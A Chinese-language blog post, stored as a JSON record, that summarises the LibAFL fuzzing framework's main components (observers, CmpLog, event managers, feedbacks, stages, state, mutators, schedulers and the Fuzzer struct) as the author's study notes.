{"posts":[{"title":"LibAFL 框架总结","content":"LibAFL的相关教程还是太少了，之前学习的时候主要是依靠epi的系列博客，但问题其实挺大，最主要的是版本比较老了，当时他用的是0.10.1的，而且就了解整个LibAFL来说，他的博客其实是目标驱动的，我认为选择的时候并没有介绍选择某个组件的理由（为什么不选其他的，我们是否还有别的选择之类），这当然不是作者的问题，但鉴于LibAFL并没有一个学习难度足够平滑的教程，我们唯一的选择大概只有看它的API文档，恰巧rust自动生成的API文档其实足够翔实，我来总结一下，方便自己对LibAFL的大部分组件有一个初步的笼统的了解，另附LibAFL简单介绍，用于应付面试tokensTokens是一些对目标程序有特殊意义的字节序列或字符串，比如文件格式的魔术数字、协议的关键词等。在LibAFL中，我们可以通过提供一个token文件，将这些tokens加载到Fuzzing状态的元数据中。然后，像StdMOptMutator配合tokens_mutations这样的变异器，就可以在变异输入时使用这些tokens，例如将它们插入或替换到现有输入中。这样做的好处是，Fuzzer可以更快地生成能够通过程序初步解析、触及更深代码逻辑的输入，从而提高发现漏洞的效率，特别是对于那些输入结构要求比较严格的目标程序。Durationrust标准库中用来表示时间跨度的一个结构体module对于libafl_qemu中的module，准确描述为：扩展QEMU功能的插件或钩子(Hooks)：它们允许你在QEMU模拟执行目标程序的各个关键阶段注入自定义的Rust代码。信息收集与交互：它们的主要目的是从QEMU的执行流中收集对Fuzzing有用的信息（如边覆盖率、比较指令的操作数），或者与Fuzzer的其他组件（如Observer）进行交互以传递这些信息。行为修改(有限)：在某些情况下，它们也可以轻微地修改QEMU的行为或目标程序的状态，但主要不是用来“传递命令”给QEMU以执行任意操作。QEMU的主要行为还是由Emulator对象及其方法（如run,set_breakpoint,write_reg等）来控制。StdEdgeCoverageModule如何工作（回顾）：它在QEMU翻译或执行基本块时，设置钩子。当发生基本块跳转（边执行）时，它内部的逻辑（或其关联的helper）会计算边的哈希，并更新由edges_observer指向的共享内存区域。它不是给QEMU发命令说“记录这条边”，而是利用QEMU提供的钩子点，在适当的时候自己执行记录操作。CmpLogModule对于Fuzzer的具体作用：提供变异提示(MutationHints)：收集到的比较操作数（尤其是那些其中一个操作数来源于Fuzzer输入，另一个是程序内部的常量或计算值）是非常有价值的“字典”或“token”。例如，如果CmpLogModule记录到程序将输入的某个部分与字符串&quot;USER_ADMIN&quot;进行了比较，那么Fuzzer在后续的变异中就可以尝试将输入的相应部分修改为&quot;USER_ADMIN&quot;。驱动Input-to-State(I2S)变异器：像I2SRandReplace这样的变异器，其核心思想就是利用这些从运行时状态（如CmpLog）中收集到的值。CmpLogObserver会读取由CmpLogModule收集的数据，并通过State的元数据(Metadata)系统提供给I2SRandReplace。I2SRandReplace就可以使用这些记录的比较值来智能地替换输入中的字节，目标是直接满足之前观察到的比较条件，从而引导程序进入新的分支。这通常比纯粹的随机变异（如bitflipping）更有效率地发现新路径。Redqueen技术的基础：CmpLog是Redqueen（或称Input-to-StateanInput-to-StateTransformation）这类Fuzzing技术的基础。Redqueen尝试自动解决程序中的比较检查，将被污染的（来自输入的）操作数替换为目标值，从而“净化”输入，使其通过检查。具体模块observercmpCmpLogObserver的核心作用是在Fuzzing过程中捕获和记录目标程序执行比较指令（如if(a==b))时的操作数值。这种技术通常被称为&quot;RedQueen&quot;、&quot;LAF-intel&quot;或&quot;CompareCoverage&quot;。为什么重要:很多程序包含大量的条件检查，Fuzzer如果只是随机变异输入，很难猜到满足这些检查的确切值，从而无法进入新的代码路径。CmpLogObserver通过记录实际参与比较的值，为Fuzzer提供了“线索”，帮助它：绕过检查:当Fuzzer知道输入0x41与常量0x78进行了比较但未通过时，它可以尝试将输入修改为0x78。探索更深路径:通过满足更多的条件检查，Fuzzer可以触及之前未曾覆盖到的代码。提高效率:相比盲目猜测，这是一种更智能、更具指导性的变异方式。libafl::observers::cmp提供了处理比较日志的通用组件和接口。StdCmpObserver是其中的一个通用实现，依赖于CmpMap来获取数据。libafl_targets::cmps::observers::cmplog::CmpLogObserver是一个CmpObserver的具体实现它的“特定性”在于，它被设计为直接与libafl_qemu的CmpLogModule紧密配合。CmpLogModule是QEMU特有的，它在QEMU执行目标程序时，会将捕获到的比较指令操作数写入一块特定格式的共享内存区域。concolic“Concolic”（符号化执行与具体执行相结合）是一种更高级的模糊测试技术。简单来说，它分几步走：程序会用一个具体的输入值运行（就像普通的模糊测试）。在运行时，它会符号化地追踪输入是如何影响程序执行路径的，并记录下程序走到当前路径所必须满足的条件（称为路径约束）。然后，它会用一个约束求解器来分析这些条件，并尝试找到能够满足一组略微不同条件的新输入值，目标是引导程序在下一次执行时走上一条新的路径。这种方法对于绕过那些随机变异很难通过的复杂检查特别有用。“符号化”就是：程序在处理输入（或者由输入派生出来的数据）时，不立即使用输入的具体数值，而是用一个代号（符号）来代表它，并且记录下程序对这个代号所做的所有运算和比较，形成了一系列的“数学公式”（符号表达式）。“路径约束”就是：一个包含了所有符号化条件（这些条件都依赖于程序的输入）的集合，这个集合精确地描述了程序为了执行到当前这一特定代码路径，其输入必须满足的所有逻辑条件。每一条从程序开始到某个点的执行路径，都有其对应的一组路径约束。约束求解器在concolicfuzzing中的核心作用就是：根据fuzzer“想要”探索的新路径所对应的逻辑条件（修改后的路径约束），智能地计算出能够实际驱动程序走到那条新路径的具体输入值。mapMapObserver基础核心作用：观察一块共享内存区域（“地图”），这块地图由被插桩的目标程序在执行时更新，用以记录代码执行信息，最常见的是代码覆盖率。AFL风格：其设计深受AFL影响，覆盖率地图通常记录的是程序执行的“边”（edges）或基本块。工作流程：插桩：目标程序被插桩。标记：目标执行时，插桩代码根据执行路径修改“地图”中的内容（如对应字节+1）。观察：LibAFL中的MapObserver在目标执行后读取“地图”状态。反馈：将观察到的“地图”信息传递给Feedback组件，判断输入是否发现了新的覆盖率或其他“有趣”的行为，从而指导后续的输入选择和变异。MapObserverTrait(接口)：定义了所有mapobserver的基本行为和契约。StdMapObserverStruct(结构体)：是MapObserver的标准、常用具体实现，用于观察由目标程序更新的地图状态。“地图”本身与大小问题“地图”：一块内存区域，用作位图或字节数组，其每个条目对应程序中可能发生的“事件”或“特征”（主要是边的覆盖）。边的映射：通过哈希算法（如(当前位置^上一个位置)%MAP_SIZE）将代码执行的“边”映射到地图中的一个索引。哈希碰撞：由于地图大小有限（如AFL的64KB），不同的实际代码边可能会映射到地图的同一个位置，这是可接受的，Fuzzer关注的是地图上是否出现了新的变化。不同类型的MapObserverConstMapObserver(固定大小地图观察者)含义：Fuzzer使用的覆盖率地图的大小在Fuzzer编译时就已确定并固定不变（例如，硬编码为64KB）。&quot;编译时知道大小&quot;：指Fuzzer开发者在编写Fuzzer时确定了地图数据结构的大小，而非指静态分析出目标程序确切的边数量。优势：编译器可能对固定大小的内存操作进行优化，加速Feedback::is_interesting的判断。适用场景：标准的AFL式Fuzzing，地图大小预先设定。VariableMapObserver(可变大小地图观察者)含义：关注地图中实际被使用的部分的大小。这个“有效大小”可能小于预分配的总大小，并且可能随执行而变化。优势：允许Fuzzer更精细地处理有效数据，可能在分析或同步地图时带来优化（例如，只处理“实际使用的256KB”，而不是整个“1MB”）。澄清：它不一定意味着地图内存本身在物理上频繁调整大小，更多的是Fuzzer如何理解和利用地图的动态有效区域。hitcount_mapObserver(命中次数地图观察者)功能：不仅记录边是否被命中，还近似记录其命中次数。分桶(Bucketing)：由于地图条目通常为1字节（0-255），使用分桶策略将不同的命中次数范围映射到有限的字节值上（如1次、2次、3次、4-7次、8-15次等）。反馈价值：能提供比简单二进制覆盖更细致的反馈，当输入使边的命中次数进入新的“桶”时，也被视为有趣。owned_mapObserver(OwnedMapObserver)核心区别：与StdMapObserver（通常观察外部管理的共享内存）不同，OwnedMapObserver自己分配并拥有其观察的地图内存。用途：简化某些场景的设置，如进程内Fuzzing，或不使用传统AFLforkserver共享内存机制的场景。它在解释地图内容的逻辑上与StdMapObserver类似。multi_mapObserver(MultiMapObserver)功能：允许同时观察和合并来自多个不同地图（内存区域）的信息。用途：当插桩产生多种类型的覆盖数据（如边覆盖、CmpLog数据）或来自多个独立组件的地图时，MultiMapObserver提供一个统一的接口来处理这些数据。它可能是概念上的合并（综合判断）而非物理合并。macros(位于libafl::observers::map下的模块)功能：主要提供与地图相关的辅助宏，供其他Observer或Feedback组件内部使用。例如crate::require_index_tracking和crate::require_novelties_tracking暗示了这些宏用于启用或检查与追踪地图索引变化和新颖性相关的功能。它本身不直接提供一个用户可实例化的Observer类型。核心要点回顾MapObserver是覆盖率引导Fuzzing的基石。它依赖于目标程序的插桩来更新共享的“地图”。最常见的用途是AFL风格的边覆盖率（通常带命中次数）。StdMapObserver是基础，其他类型如ConstMapObserver,VariableMapObserver,OwnedMapObserver,HitCountMapObserver,MultiMapObserver提供了针对不同需求（地图大小管理、数据解释、多源数据、内存所有权）的特化或变种。monitorMonitor的核心职责就是收集、统计和展示Fuzzer的运行状态和各种统计信息。events核心职责：EventManager是LibAFL中负责通信和协调的核心组件。它管理Fuzzer实例之间或Fuzzer内部组件之间的事件流。这些事件可以是新发现的测试用例、代码覆盖信息、统计数据、崩溃报告、日志消息等。关键理念：按需拼凑与灵活性：EventManager不是一个固定的“积木块”，而是按需选择和组合的“能力”组件。用户根据Fuzzing目标和部署环境选择合适的实现。事件驱动：Fuzzer的许多活动和发现都以Event的形式进行封装和传递。模块化与可扩展性：通过Traits和不同的模块化实现，支持从简单的单机日志到复杂的多机器协同Fuzzing。一、通用组件与概念(libafl::events)Event(枚举):事件系统的核心数据结构，定义了所有可传递的事件类型，如：新测试用例(NewTestcase)统计数据(Stats)目标程序崩溃(Crash)自定义用户事件(CustomBuf)日志消息(Log)EventManagerId(结构体):为每个Fuzzer实例提供唯一ID，在多进程环境中尤为重要。NopEventManager(结构体):“空操作”事件管理器，不执行实际事件处理，主要用于测试或不需要事件管理的简单场景。MonitorTypedEventManager(结构体):包装器，为其他EventManager关联一个Monitor类型，以统一API。ShutdownSignalData(结构体)与EVENTMGR_SIGHANDLER_STATE(静态变量):用于捕获ctrl-c信号，实现Fuzzer的优雅退出。核心Traits(接口):EventFirer:定义发送（触发）事件的能力。EventReceiver:定义处理接收到的事件的能力。EventRestarter:规范可重启事件管理器的行为（如on_restart）。HasEventManagerId:允许查询EventManager的唯一ID。ProgressReporter:定义客户端向Broker报告Fuzzing进度的能力。SendExiting:定义Fuzzer退出前发送通知的能力。AwaitRestartSafe:定义安全等待重启的行为。辅助函数:提供一些Trait方法的默认实现，如std_maybe_report_progress。二、EventManager的不同实现模块simple(libafl::events::simple):特点:非常简单的事件管理器，主要支持日志输出，不支持多进程间的事件通信。SimpleEventManager:基础的单线程、仅日志记录的实现。SimpleRestartingEventManager:(你代码中使用的)在SimpleEventManager基础上增加了子进程重启功能，增强了单机Fuzzing的鲁棒性。它通过Monitor输出日志。llmp(libafl::events::llmp):LowLevelMessagePassing特点:专为可扩展的单机多进程Fuzzing设计的高性能、低开销进程间通信(IPC)机制。核心技术:主要依赖共享内存和无锁/接近无锁的数据结构。restarting子模块:提供了可重启的LLMP事件管理器，能在子进程崩溃时重启并可能恢复状态。其他特性:支持消息压缩(COMPRESS_THRESHOLD)，状态持久化配置(LlmpShouldSaveState)。与LLVM无关:LLMP是LibAFL内部的通信机制，与编译器基础设施LLVM没有直接关系。tcp(libafl::events::tcp):特点:用于实现跨多台机器的分布式Fuzzing，使用TCP/IP协议进行网络通信。架构:通常采用Broker-Client模型。TcpEventBroker:实现Broker角色，监听TCP连接，中转事件。TcpEventManager:客户端事件管理器，通过TCP发送事件给Broker。TcpRestartingEventManager:支持在网络环境中重启Fuzzer实例并恢复状态。launcher(libafl::events::launcher):核心作用:并行启动和管理多个Fuzzer实例，简化在多核CPU上的并行Fuzzing设置。功能:自动管理Broker启动。隐藏/显示子进程输出。支持通过TCP连接多节点/多机器。在Unix系统上可选择使用fork或重新执行命令的方式创建子进程。CentralizedLauncher:特殊版本，旨在最小化共享测试用例的重复执行。broker_hooks(libafl::events::broker_hooks):作用:为Broker进程提供扩展机制，允许用户在Broker处理标准事件的流程中，通过挂载自定义代码(Hooks)来修改或增强Broker的行为。StdLlmpEventHook:基于LLMP的Broker钩子具体实现。非处理特殊“钩子事件”:而是为Broker的标准事件处理流程提供扩展点。centralized(libafl::events::centralized):作用:实现一种更高效的消息传递架构，通常采用主从(main-secondary)架构，可能与另一个Broker协同工作。CentralizedEventManager:核心实现，作为包装器协调主从节点间的事件流。目标:优化大规模Fuzzing集群中的消息路由和分发，减少通信开销。events_hooks(libafl::events::events_hooks):作用:允许用户在EventManager尝试接收(try_receive)来自其他客户端的消息之前或之后，注入自定义的预处理或后处理代码。实现方式:主要通过定义EventManagerHookTrait，用户可自行实现具体钩子逻辑（如解密、校验、日志）。关注点:EventManager的消息接收流程。multi_machine(libafl::events::multi_machine):作用:支持跨多台物理机器进行协同Fuzzing的组件。核心功能:基于TCP的跨机器通信(MultiMachineMsg)。节点管理与策略定义(NodeDescriptor,NodePolicy)。多机器Broker钩子(TcpMultiMachineHooks)。网络通信相关的状态管理(TcpMultiMachineState)。feedbackFeedback机制的核心作用是在目标程序每次执行后，分析来自Observer(观察者)的原始执行数据，并判断刚刚执行的输入是否“有趣”(is_interesting)。如果一个输入被判定为“有趣”，它通常会被添加到语料库(Corpus)中，作为后续输入变异的基础。它是覆盖率引导Fuzzing的关键。核心流程：Observer收集原始执行数据（如覆盖率、时间、比较日志等）。Feedback分析这些数据。Feedback返回一个布尔值(is_interesting)，指示输入是否有价值。主要的Feedback类型与模块基于代码覆盖率(libafl::feedbacks::map):MaxMapFeedback:(常用)配合边覆盖率观察者(HitcountsMapObserver)，当输入触发新代码边或使边的命中次数进入新“桶”时，判定为有趣。目标是最大化覆盖。基于执行退出类型(ExitKind):CrashFeedback:(常用)当目标程序崩溃(ExitKind::Crash)时，判定为有趣。TimeoutFeedback:(常用)当目标程序超时(ExitKind::Timeout)时，判定为有趣。ExitKindFeedback:更通用的ExitKind检查反馈。DiffExitKindFeedback:用于差分Fuzzing，比较不同执行的ExitKind差异。基于时间(libafl::feedbacks::TimeFeedback):与TimeObserver配合，跟踪执行时间。可以将执行时间作为辅助反馈，或用于确保输入执行时间在合理范围内。基于特定值/模式:BoolValueFeedback:返回固定的true或false。NewHashFeedback:使用回溯哈希等判断案例是否新颖。ValueBloomFeedback:使用布隆过滤器检查值是否新观察到。特殊用途:CaptureFeedback:捕获特定事件（如超时）的输入。ConcolicFeedback:用于混合执行/符号执行。NautilusFeedback:与Nautilus基于语法的Fuzzer配合。CustomFilenameToTestcaseFeedback:自定义文件名与测试用例的关联。DifferentialFeedback:比较两个同类型观察者的内容差异。StdIoFeedback:基于标准输出/错误流的内容。TransferredFeedback:检测测试用例是否从其他Fuzzer节点传输而来。核心要点回顾：Feedback是Fuzzing循环中进行决策的关键，它决定了哪些输入值得保留和进一步变异。它将Observer收集的原始、复杂数据简化为“有趣”或“不有趣”的判断。通过组合不同的Feedback，可以构建出复杂的、多维度的输入评估标准。MaxMapFeedback(覆盖率)和CrashFeedback是最基础和最重要的Feedback类型之一。stages在LibAFL中，一个Stage代表Fuzzing过程中的一个不同操作步骤或技术。它通常针对语料库(Corpus)中的单个输入（测试用例）进行处理，目的是分析、修改该输入，或者利用它来创造新的、有趣的测试用例，或为现有测试用例添加元数据。可以将Fuzzing过程看作一个流水线，每个Stage是流水线中的一个环节。StageTrait(核心接口):所有Stage都必须实现此接口，定义了一个Fuzzing步骤的核心逻辑，如perform(...)方法。StagesTupleTrait:允许将多个Stage组合在一起，按顺序对每个输入执行。一、主要的Stage类型/模块mutational(变异阶段):核心Fuzzing步骤：获取输入，使用Mutators(变异器)进行多次随机变异，执行变异后的输入，并由Feedbacks(反馈)评估是否“有趣”(如产生新覆盖或崩溃)。示例：StdMutationalStage。power(能量调度阶段):与能量调度配合：根据“能量”或优先级分配Fuzzing精力（如变异次数）给不同的输入。通常在CalibrationStage之后。示例：StdPowerMutationalStage(结合变异与能量调度)。calibrate(校准阶段):初始度量：收集目标执行的初始指标，如平均执行时间、初始覆盖图状态/大小。为后续的Feedback和Scheduler提供基准数据。tracing(追踪阶段):收集元数据：追踪目标执行，用元数据（如CmpLog比较日志）丰富测试用例。示例：ShadowTracingStage(常用于QEMU模式收集CmpLog)。shadow(影子执行阶段):并行追踪/观察：运行一个“影子”执行器和观察者，可以与进程内执行器一起使用。用于收集主执行路径之外的详细信息或不同类型的观察数据。generation(生成阶段):从头创建输入：专注于生成单个新输入并评估，适用于基于语法或生成式Fuzzing。示例：GenStage。tmin(测试用例最小化阶段):减小输入大小：尝试在保持输入“有趣”特性的前提下，最小化其大小。示例：StdTMinMutationalStage。同步阶段:dump(DumpToDiskStage):将当前语料库和崩溃转储到磁盘，便于持久化或与其他Fuzzer(如AFL++)同步。sync(SyncFromDiskStage):从磁盘导入输入到语料库，用于同步或加载初始种子。其他特定用途/工具类阶段:afl_stats:计算和报告AFL++风格的统计信息。colorization:实现AFL++的&quot;colorization&quot;技术(与路径发现相关)。concolic:支持混合执行(具体执行+符号执行)的阶段。logics:阶段包装器，为阶段列表添加逻辑组合或条件。push:返回输入而不是直接调用执行器，用于自定义流程。replay:重新执行语料库中的所有输入一次。time_tracker:包装另一个阶段以专门追踪其执行时间。tuneable:变异迭代次数可在运行时动态调整的变异阶段。unicode:分析Unicode风格输入常见变异的阶段。verify_timeouts:重新运行超时输入以确认是否为真挂起(通常配合CaptureTimeoutFeedback)。二、其他相关定义Structs(结构体):ClosureStage:允许通过一个简单的闭包创建自定义Stage。ExecutionCountRestartHelper/RetryCountRestartHelper:用于管理需要特定执行次数或重试次数的Stage，尤其在可重启场景下。StageId:Stage的唯一标识符。Traits(接口):Restartable:定义Stage在Fuzzer重启时的行为规范，以恢复进度。核心要点回顾:Stage是Fuzzing循环中执行具体Fuzzing技术的操作单元。LibAFL提供多种预置Stage，并允许用户自定义Stage。Stage的顺序通常很重要，不同Stage协同工作以实现Fuzzing目标。这种模块化设计使得用户可以灵活组合不同的技术来构建定制化的Fuzzing策略。stateState是LibAFLFuzzing框架的核心数据中心和状态管理器。它在整个Fuzzing运行期间负责跟踪、存储和管理所有动态数据、配置以及Fuzzing进度。几乎所有其他LibAFL组件（如Fuzzer核心、EventManager、Executor、Feedback、Corpus、Mutator、Stage）都会与State进行交互。StdState(标准状态实现):这是LibAFL中最常用、最标准的State具体实现。它包含Fuzzing运行所需的大部分标准组件和数据字段，例如：随机数生成器(Rand):为Fuzzing中的各种随机决策（选择输入、变异等）提供随机性。主语料库(Corpus):存储和管理那些被Feedback机制认为是“有趣”的、能够触发新行为或覆盖的测试用例。这是Fuzzer“学习”的基础。解决方案语料库(Solutionscorpus):专门用于存储那些导致目标程序崩溃、超时或其他被定义为“成功利用”或“目标达成”的输入。执行次数(Executions):记录Fuzzer已经执行测试用例的总次数。Fuzzing开始时间(StartTime):记录Fuzzing会话的起始时间，用于计算运行总时长、执行速度等统计信息。元数据映射(MetadataMap):一个非常灵活的键值存储，允许不同的组件在State中存储和共享自定义的、与状态相关的附加信息。例如：Tokens(用户提供的或Fuzzer学习到的“魔法数”)。CmpLogObserver收集到的比较指令操作数值。其他特定Stage或Feedback可能需要的临时或持久化数据。当前测试用例信息:存储当前正在被处理或Fuzzing的测试用例的相关信息。最大输入大小(MaxSize):控制Fuzzer处理的输入的最大允许大小。核心State相关Traits(接口/规范):LibAFL大量使用Traits来定义State应具备的能力或应提供的信息，从而实现模块化和解耦。组件通过请求实现了特定Trait的State来工作，而不是依赖于某个具体的State类型。HasCorpus:表明State拥有或可以访问一个主语料库。HasSolutions:表明State拥有或可以访问一个解决方案语料库。HasRand:表明State拥有或可以访问一个随机数生成器。HasExecutions:允许查询当前的执行次数。HasStartTime:允许查询Fuzzing的开始时间。HasMaxSize:允许查询和可能修改输入的最大大小。HasClientPerfMonitor/MaybeHasClientPerfMonitor:提供客户端性能监视器。HasCurrentStageId:跟踪当前执行的StageID。HasCurrentTestcase:持有当前正在处理的测试用例信息。HasMetadata(虽然未直接列在state模块顶级，但与MetadataMap紧密相关):允许State存储和检索任意类型的元数据。Stoppable:为State或相关组件提供一个检查是否应停止Fuzzing的API。其他相关结构体:LoadConfig:用于配置从磁盘加载初始种子时的选项。NopState:极简的状态实现，主要用于测试。StageStack:跟踪当前Stage的执行栈，用于处理嵌套Stage。核心要点回顾:State是Fuzzing过程中的单一事实来源(SingleSourceofTruth)，集中管理所有重要数据。StdState是功能完备的标准实现，包含了大部分Fuzzing场景所需的字段和功能。通过Traits(如HasCorpus,HasRand)，LibAFL实现了组件与State之间的松耦合，增强了框架的模块化、灵活性和可扩展性。不同的组件只依赖于它们需要的State能力，而不是具体的State类型。MetadataMap为State提供了强大的扩展能力，允许动态添加和管理各种自定义数据。Mutator核心作用:Mutator是LibAFLFuzzing框架中负责对输入进行修改和转换以产生新测试用例的组件。它们是Fuzzer探索程序状态空间、尝试触发新行为和发现漏洞的主要手段。核心理念:通过对现有输入应用一系列的变异操作，生成多样化的新输入，以期覆盖目标程序的更多代码路径并发现潜在的缺陷。一、MutatorTrait(核心接口)定义了所有单一输入变异器的基本行为。主要方法是mutate(...)，它接收当前状态、要变异的输入和随机数生成器，并返回一个MutationResult(指示变异是否成功以及输入是否被修改)。MutatorsTupleTrait:允许将多个Mutator组合起来按顺序执行。二、主要的Mutator类型/模块基础/通用变异(libafl::mutators::mutations):提供大量字节级的基本变异操作，如位翻转、字节翻转、算术变异、数据块操作（删除、复制、交换）、拼接等。Havoc风格变异(libafl::mutators::havoc_mutations):类似AFL++的Havoc策略，组合多种基础变异，进行高随机性、高强度的变异，以快速产生差异较大的输入。基于Token的变异(libafl::mutators::token_mutations):利用Fuzzer状态中存储的&quot;tokens&quot;（字典、魔法数、关键词）来指导变异，如插入Token或用Token替换输入部分。对特定格式或协议的输入非常有效。调度型变异器(libafl::mutators::scheduled):ScheduledMutator:内部可以包含一个变异器列表，并按某种策略（随机、顺序、权重）调度执行这些内部变异器，允许组合多种变异策略。MOpt变异调度器(libafl::mutators::mopt_mutator):StdMOptMutator:(常用)AFL++中引入的高级变异调度器，基于粒子群优化思想，尝试学习并动态调整选择哪些基础变异算子更有效。语法感知型变异器:gramatron:使用语法自动机进行变异，确保输入符合预定义语法。nautilus:另一个基于语法的Fuzzer的变异器。特定输入类型变异器:encoded_mutations:针对EncodedInputs(如protobuf编码的输入)。list:针对列表形式的输入(ListInputs)。multi:针对由多个部分组成的输入(MultipartInputs)。numeric:针对整数类型输入的变异。unicode:保留Unicode字符串类别的变异。辅助/包装型变异器:grimoire:基于学习输入结构并生成符合该结构的输入的策略。hash:包装其他Mutator，通过哈希比较确保输入确实发生改变。mapping:允许混合和匹配不同的Mutator和Input类型。tuneable:ScheduledMutator的扩展，允许运行时调整内部变异器的调度。三、其他相关定义Structs(结构体):BoolInvertMutator:反转布尔值的简单变异器。NopMutator:“空操作”变异器，用于测试。MutationId:标识变异器元组中某个变异的索引。Enums(枚举):MutationResult:表示变异操作的结果(Mutated,Skipped,Invalid)。Traits(接口):MultiMutator:一次接收一个输入，返回多个变异后输入的变异器。核心要点回顾:生成新输入的引擎:Mutator是Fuzzing过程中产生新测试用例的核心。多样性:LibAFL提供了从基础字节操作到高级上下文感知策略的丰富变异器。组合与调度是关键:通过ScheduledMutator、MutatorsTuple或像StdMOptMutator这样的高级调度器，可以将多种变异策略组合起来以增强效果。上下文感知:一些高级变异器会利用从Fuzzing过程中学习到的信息（如Tokens、CmpLog结果）来指导变异，使其更具目标性。适应性:针对不同的输入类型（如结构化数据、数值、字符串）和目标程序特性，选择或定制合适的变异器组合是提高Fuzzing效率的关键。schedulerScheduler决定了Fuzzer如何以及按什么顺序从语料库(Corpus)中选择下一个测试用例(Testcase)进行Fuzzing。一个好的调度策略能够显着影响Fuzzing的效率，它可以优先选择那些更有可能发现新代码路径或触发漏洞的输入。核心理念:通过智能地选择和排序语料库中的输入，最大化Fuzzing的效果，避免在低价值的输入上浪费过多的时间和计算资源。一、SchedulerTrait(核心接口)定义了所有调度器的基本行为。核心方法是next()，用于从语料库中请求下一个要处理的测试用例的索引。包含钩子方法，如on_add(当新测试用例添加到语料库时调用)、on_remove(当测试用例从语料库移除时调用，需要实现RemovableSchedulerTrait)、on_replace(当测试用例被替换时调用，需要实现RemovableSchedulerTrait)，这些钩子允许调度器在语料库发生变化时收集数据或更新其内部状态，以支持复杂的调度算法。二、主要的Scheduler类型/模块queue(队列调度器):AFL风格队列机制:实现类似于经典AFL的队列机制，通常是先进先出(FIFO)或有一些简单的优先级策略。示例:QueueScheduler(虽然文档中未直接列出，但StdScheduler通常基于此)。powersched(能量调度器):基于能量分配:结合“能量调度”(PowerSchedules)算法。这种算法会为语料库中的每个输入分配一定的“能量”，能量越高的输入会被更频繁地选中或进行更多的变异。能量的分配通常基于输入的效果（如发现新覆盖、执行时间等）。你的Fuzzer代码中，PowerQueueScheduler就是这类调度器的代表。minimizer(最小化调度器):子集选择:这类调度器只从整个语料库的一个子集中选择测试用例提供给Fuzzer。目的:可能用于专注Fuzzing语料库中特定的一部分，或者与测试用例最小化策略配合，只使用最小化后的核心语料。accounting(覆盖率审计调度器):基于详细覆盖率分析:这种调度器会进行更细致的覆盖率审计，以确保Fuzzer在所有已发现的路径上都花费了足够的精力，并优先探索那些能够覆盖到“稀有”或“昂贵”路径的输入。引用了NDSS的论文，表明其背后有学术研究支持。probabilistic_sampling(概率采样调度器):随机抽样:从语料库中按一定概率随机抽取测试用例。可以引入更多随机性，但也可能不如基于覆盖率或能量的调度器高效。testcase_score(测试用例评分):为输入打分:提供一种评估机制，为语料库中的每个条目（测试用例）打分。这个分数可以被其他调度器用来决定选择哪个输入。tuneable(可调队列调度器):扩展队列调度器:在AFL风格队列调度器的基础上，增加了手动选择下一个语料库条目的方法，提供了更灵活的控制。weighted(加权队列调度器):AFL++风格:类似于AFL++中的加权队列，可能会根据输入的某些属性（如大小、发现时间、是否触发新行为等）给予不同的权重，影响其被选中的概率。RandScheduler(随机调度器)(位于Structs):纯随机选择:简单地从语料库中随机选择一个测试用例。这是最基础的调度方式。三、其他相关定义Traits(接口):AflScheduler:为AFL风格的调度器定义通用的元数据操作。HasQueueCycles:标记那些跟踪“队列周期”（完整遍历一遍语料库的次数）的调度器。RemovableScheduler:扩展了SchedulerTrait，增加了on_remove和on_replace钩子，用于在语料库条目被移除或替换时通知调度器。Functions(函数):on_add_metadata_default,on_evaluation_metadata_default,on_next_metadata_default:这些可能是为SchedulerTrait中的钩子方法提供的默认实现或辅助函数，用于处理与测试用例元数据相关的操作。TypeAliases(类型别名):StdScheduler:LibAFL中默认使用的标准调度器类型。它通常是一个经过良好配置和优化的调度器实现（例如，可能是基于队列和能量调度的组合）。核心要点回顾:Scheduler的核心任务是从语料库中选择下一个要Fuzz的输入。不同的调度策略会显着影响Fuzzing的方向和效率。LibAFL提供了多种调度器实现，从简单的随机选择到复杂的基于能量、覆盖率审计或评分的策略。许多调度器通过实现SchedulerTrait中的钩子方法（如on_add）来动态适应语料库的变化。StdScheduler是LibAFL推荐的默认调度器。你的Fuzzer中使用了IndexesLenTimeMinimizerScheduler包装PowerQueueScheduler，这是一种结合了输入最小化、长度/时间考量以及能量调度的先进策略。FuzzerFuzzer结构体是整个Fuzzing活动(fuzzcampaign)的主要控制中心和执行者。它将所有其他核心组件（如State,EventManager,Executor,Feedback,Scheduler,Stages）有机地组织和驱动起来，以执行完整的Fuzzing循环。一、核心结构体(Structs)StdFuzzer:描述:这是LibAFL提供的默认、标准的Fuzzer实例，适用于大多数日常Fuzzing任务.作用:它封装了Fuzzing的主循环逻辑，包括从调度器(Scheduler)获取下一个要测试的输入，执行该输入（通过Executor），评估执行结果（通过Feedback和Observers），并将有趣的输入添加回语料库(Corpus)。NopFuzzer:描述:一个“空操作”的Fuzzer，它不执行任何实际的Fuzzing操作.作用:主要用于测试或作为不需要实际Fuzzing时的占位符。BloomInputFilter:描述:一种基于布隆过滤器(BloomFilter)的输入过滤器，用于概率性地防止重复执行相同的输入.作用:布隆过滤器是一种空间效率高的数据结构，可以用来判断一个元素是否“可能”在一个集合中。在这里，它可以快速地判断一个输入是否与之前执行过的输入相似或相同，从而避免不必要的重复执行，提高Fuzzing效率。NopInputFilter:描述:一个伪过滤器，它会允许执行每一个输入，即不进行任何过滤.作用:当不需要输入过滤功能时使用。ExecuteInputResult:描述:表示执行一个输入后的结果，特别是指示这个输入应该被添加到哪个语料库。例如，是添加到主语料库还是解决方案语料库。二、核心Traits(接口/规范)这些Trait定义了Fuzzer及其相关组件应具备的核心能力和职责。Fuzzer:描述:最主要的FuzzerTrait，定义了Fuzzer的基本行为和驱动整个Fuzzing过程的能力。它通常包含启动Fuzzing循环(fuzz_loop)、单步执行(fuzz_one)等核心方法。Evaluator/EvaluatorObservers:描述:Evaluator定义了评估一个输入并相应修改Fuzzer状态的行为。EvaluatorObservers可能是Evaluator的一个变种或辅助Trait，强调了在评估过程中对观察者(Observers)的使用。作用:在输入执行后，根据Feedback和Observers的结果来判断输入是否有趣，并决定是否将其加入语料库、更新状态等。EventProcessor:描述:定义了从EventManager接收事件并对其进行评估处理的能力。作用:在分布式或多进程Fuzzing中，Fuzzer需要能够接收和处理来自其他Fuzzer实例或Broker的事件（如新的测试用例）。ExecutesInput:描述:标记那些能够执行输入的结构体。作用:Fuzzer自身通常会实现这个Trait，因为它负责驱动输入的执行。ExecutionProcessor:描述:定义了使用Feedback来评估一个输入是否有趣的行为。作用:这是Fuzzer判断输入价值的核心逻辑部分，紧密关联Feedback机制。HasFeedback:描述:表明一个结构体（通常是Fuzzer或State）持有一个或多个Feedback实例。HasObjective:描述:表明一个结构体持有一个“目标”Feedback(ObjectiveFeedback)。目标Feedback通常用于判断是否达到了Fuzzing的最终目标（如发现崩溃）。